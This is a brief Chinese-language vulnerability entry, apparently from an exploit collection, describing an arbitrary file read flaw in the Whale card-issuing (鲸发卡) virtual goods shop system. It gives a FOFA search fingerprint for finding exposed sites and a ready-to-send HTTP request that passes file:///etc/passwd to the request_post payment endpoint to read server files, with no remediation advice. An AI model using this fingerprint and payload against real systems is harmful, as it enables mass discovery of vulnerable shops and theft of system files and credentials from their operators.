## 鲸发卡系统自动发卡网request_post存在任意文件读取漏洞

 **鲸发卡系统是一款专业的虚拟商品寄售系统，支持多种功能和模式，为商户和买家提供便捷、绿色、安全、快速的销售和购买体验。本文档介绍了鲸发卡系统的特色功能、客户案例.**

## fofa

```yaml
"/static/theme/maowang51/css/style.css"
```

## poc

```yaml
GET /pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]=aaa HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```

![image-20240709133653012](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407091337787.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/Cd50RjZcVMvv1sOBPR9gqg